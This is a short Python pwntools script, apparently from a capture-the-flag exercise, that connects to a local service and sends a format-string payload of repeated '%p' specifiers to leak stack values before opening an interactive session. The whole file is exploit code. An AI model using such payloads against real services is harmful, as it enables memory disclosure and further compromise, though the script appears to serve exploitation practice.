#!/usr/bin/env python

from pwn import *

host, port = '127.0.0.1', 7126
y = remote(host, port)

a = 0x6012ac

fmt_string = '%p.' * 30
p = fmt_string.ljust(0x40, )
y.sendafter('name ?', p)

y.interactive()
